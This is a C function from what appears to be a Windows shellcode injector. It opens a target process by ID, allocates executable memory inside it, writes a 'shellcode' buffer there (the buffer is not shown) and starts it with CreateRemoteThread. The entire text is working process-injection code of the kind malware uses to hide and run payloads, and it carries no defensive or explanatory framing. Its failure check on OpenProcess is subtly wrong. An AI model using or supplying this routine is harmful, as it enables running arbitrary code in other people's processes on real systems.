void inject(DWORD pid)
{
	HANDLE phd,h;
	LPVOID shell;
	
	phd=OpenProcess(PROCESS_ALL_ACCESS,0,pid);
	
	if(phd==INVALID_HANDLE_VALUE)
	{
		printf("\nOpenProcess() Failed."); return ;
	}
	
	shell=VirtualAllocEx(phd,0,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	if(shell==NULL)
	{
		printf("\nVirtualAllocEx() Failed");  CloseHandle(phd); return ;
	}
	
	WriteProcessMemory(phd,shell,shellcode,sizeof(shellcode),0);
	printf("\nInjection successfull\n");
	printf("Running Shellcode......\n");
	
	h=CreateRemoteThread(phd,NULL,0,(LPTHREAD_START_ROUTINE)shell,NULL,0,0);
	if(h==NULL)
	{
		printf("Failed to Run Shellcode\n"); return ;
	}
	else
		printf("shellcode Execution Successfull");
}